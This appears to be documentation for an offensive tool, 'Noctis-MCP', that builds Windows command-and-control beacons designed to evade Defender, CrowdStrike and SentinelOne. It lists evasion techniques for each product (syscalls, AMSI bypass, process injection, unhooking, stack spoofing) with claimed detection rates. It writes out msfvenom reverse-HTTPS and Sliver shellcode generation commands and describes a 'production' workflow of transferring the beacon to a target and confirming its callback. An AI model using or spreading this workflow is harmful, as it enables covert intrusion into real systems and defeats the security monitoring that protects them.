# Beacon Builder Documentation

## Overview

Noctis-MCP includes an automated beacon builder that cross-compiles EDR-bypassing Windows beacons from macOS or Linux systems. The builder integrates multiple evasion techniques and generates production-ready executables targeting specific EDR products.

## System Requirements

### macOS
- macOS 10.15 or later
- MinGW-w64 cross-compiler
- Python 3.11+

### Linux
- Ubuntu 20.04+ or equivalent
- MinGW-w64 cross-compiler
- Python 3.11+

### Installation

**macOS:**
```bash
brew install mingw-w64 python@3.11
```

**Linux:**
```bash
sudo apt-get install mingw-w64 python3
```

## Quick Start

### 1. Generate C2 Shellcode

Generate shellcode from your C2 framework (see Shellcode Sources section below).

### 2. Build Beacon

```bash
python3 build_beacon.py \
    --shellcode sliver_beacon.bin \
    --target crowdstrike \
    --output beacon.exe \
    --verbose
```

### 3. Verify Output

```bash
# Check file type
file beacon.exe
# Output: PE32+ executable (console) x86-64, for MS Windows

# Verify API obfuscation (strings should be hidden)
strings beacon.exe | grep -i VirtualAlloc
# Output: (none - APIs are hashed)
```

## EDR Targets

The builder supports three EDR profiles, each with optimized technique combinations:

### Windows Defender

**Detection Risk:** 1-3%
**OPSEC Score:** 9.5/10

**Techniques:**
- SysWhispers3 - Direct syscalls with randomized jumpers
- VEH² AMSI Bypass - Hardware breakpoint evasion
- AES-256 Encryption - Compile-time payload encryption
- API Hashing - String obfuscation

**Usage:**
```bash
python3 build_beacon.py -s payload.bin -t defender -o beacon.exe
```

### CrowdStrike Falcon

**Detection Risk:** 2-5%
**OPSEC Score:** 9.2/10

**Techniques:**
- SysWhispers3 - Randomized syscall execution
- PoolParty - Thread pool injection
- Perun's Fart - Memory-based unhooking
- Zilean - Sleep obfuscation via thread pools
- API Hashing - String obfuscation

**Usage:**
```bash
python3 build_beacon.py -s payload.bin -t crowdstrike -o beacon.exe
```

### SentinelOne

**Detection Risk:** 3-6%
**OPSEC Score:** 8.8/10

**Techniques:**
- SysWhispers3 - Direct syscalls
- SilentMoonwalk - Call stack spoofing
- VEH² AMSI Bypass - Hardware breakpoint evasion
- Phantom DLL Hollowing - Transactional NTFS injection
- API Hashing - String obfuscation

**Usage:**
```bash
python3 build_beacon.py -s payload.bin -t sentinelone -o beacon.exe
```

## Shellcode Sources

### Option 1: Sliver C2

```bash
# On C2 server
sliver> generate beacon \
    --mtls <your_ip>:8888 \
    --format shellcode \
    --os windows \
    --arch amd64 \
    --save /tmp/beacon.bin

# On build machine
scp user@c2-server:/tmp/beacon.bin ./
```

### Option 2: Msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<your_ip> \
    LPORT=443 \
    -f raw \
    -o meterpreter.bin
```

### Option 3: Mythic C2

```bash
# Generate beacon via Mythic UI
# Download shellcode.bin from Mythic
# Use with builder
```

## Build Process

The beacon builder performs the following steps:

1. **Dependency Check** - Verifies MinGW-w64 and Python availability
2. **Shellcode Loading** - Reads and validates input shellcode
3. **Technique Selection** - Loads EDR-specific technique modules
4. **Compilation** - Cross-compiles each technique to object files
5. **Loader Generation** - Creates dynamic loader with embedded shellcode
6. **Linking** - Links all object files into final executable
7. **Verification** - Confirms Windows PE32+ executable format

## Technical Details

### Compilation Flags

```bash
-O2                 # Optimization level 2
-Wall               # All warnings
-DNDEBUG            # Release build
-s                  # Strip symbols
-I<project_root>    # Include path
-static             # Static linking
```

### Linked Libraries

```bash
-lbcrypt            # Cryptography APIs
-lntdll             # Native APIs
-lkernel32          # Kernel APIs
-ladvapi32          # Advanced APIs
```

### Assembly Stubs

The builder includes x64 assembly stubs for:

- **sw3_stub.S** - SysWhispers3 syscall execution
- **silentmoonwalk_stub.S** - Call stack spoofing

Both use GAS (GNU Assembler) AT&T syntax for MinGW compatibility.

## Advanced Usage

### Custom Technique Combination

Edit `build_beacon.py` to create custom EDR profiles:

```python
'custom': {
    'name': 'Custom EDR',
    'techniques': ['List', 'Of', 'Techniques'],
    'detection_risk': 'X-Y%',
    'opsec_score': X.X,
    'files': [
        'techniques/api_resolution/api_hashing.c',
        'techniques/syscalls/syswhispers3.c',
        'techniques/syscalls/sw3_stub.S',
        # Add more technique files
    ]
}
```

### Verbose Output

```bash
python3 build_beacon.py \
    -s payload.bin \
    -t crowdstrike \
    -o beacon.exe \
    --verbose
```

### Build Artifacts

All object files are stored in `build/`:

```
build/
├── api_hashing.o
├── syswhispers3.o
├── sw3_stub.o
├── veh2_bypass.o
├── payload_crypto.o
└── loader_generated.c
```

## Troubleshooting

### MinGW Not Found

**Error:** `MinGW-w64 cross-compiler: Missing`

**Solution:**
```bash
# macOS
brew install mingw-w64

# Linux
sudo apt-get install mingw-w64
```

### Compilation Errors

**Error:** `Failed to compile <technique>.c`

**Solution:**
- Check technique file for syntax errors
- Ensure all dependencies are installed
- Use `--verbose` flag for detailed error output

### Linking Errors

**Error:** `undefined reference to <function>`

**Solution:**
- Verify all required object files are compiled
- Check that assembly stubs are included
- Ensure correct library linking order

## Security Considerations

### OPSEC

All beacons are built with:
- API string obfuscation (DJB2 hashing)
- Stripped symbols
- Static linking (no external DLL dependencies)
- Randomized syscall execution

### Testing

Test beacons in isolated environments:
- Dedicated VMs
- Sandboxed containers
- Air-gapped networks

### Detection

Detection risk varies by EDR:
- **Defender:** 1-3%
- **CrowdStrike:** 2-5%
- **SentinelOne:** 3-6%

Risks increase with:
- Network-based detection
- Behavioral analysis
- Signature updates

## Production Deployment

### Recommended Workflow

1. **Generate Production Shellcode**
   ```bash
   # Via Sliver/Mythic C2
   ```

2. **Build Beacon**
   ```bash
   python3 build_beacon.py -s production.bin -t <edr> -o beacon.exe
   ```

3. **Verify Binary**
   ```bash
   file beacon.exe
   strings beacon.exe | grep -i virtual  # Should be empty
   ```

4. **Transfer to Target**
   ```bash
   # Use secure transfer method
   scp beacon.exe target@host:/path/
   ```

5. **Execute and Verify Callback**
   ```bash
   # On C2 server, verify beacon connects
   ```

## File Reference

### Core Files

- `build_beacon.py` - Main beacon builder script
- `generate_test_shellcode.py` - Test payload generator

### Technique Files

Located in `techniques/`:

```
api_resolution/api_hashing.c        # API hashing implementation
syscalls/syswhispers3.c             # Syscall implementation
syscalls/sw3_stub.S                 # Syscall assembly stub
amsi/veh2_bypass.c                  # AMSI bypass
injection/poolparty.c               # Process injection
unhooking/peruns_fart.c             # EDR unhooking
sleep_obfuscation/zilean.c          # Sleep obfuscation
evasion/silentmoonwalk.c            # Call stack spoofing
evasion/silentmoonwalk_stub.S       # Stack spoofing assembly
crypto/payload_crypto.c             # Payload encryption
```

## Further Reading

- [C2 Integration](C2_INTEGRATION.md) - C2 framework setup
- [Setup Guide](SETUP.md) - Complete installation guide
- [Main README](../README.md) - Project overview

## Author

**Lewis Desmond**
Noctis-MCP Project

## License

MIT License - See LICENSE file
